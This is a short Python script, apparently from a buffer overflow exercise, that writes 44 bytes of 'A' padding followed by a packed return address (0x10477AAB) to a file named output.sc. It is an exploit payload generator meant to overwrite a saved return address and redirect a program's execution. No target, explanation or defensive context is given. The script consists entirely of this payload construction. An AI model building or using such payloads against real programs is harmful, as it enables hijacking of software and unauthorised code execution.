import struct

buf = b""
buf += b"A"*44
buf += struct.pack("I", 0x10477AAB)

with open("output.sc", "wb") as f:
    f.write(buf)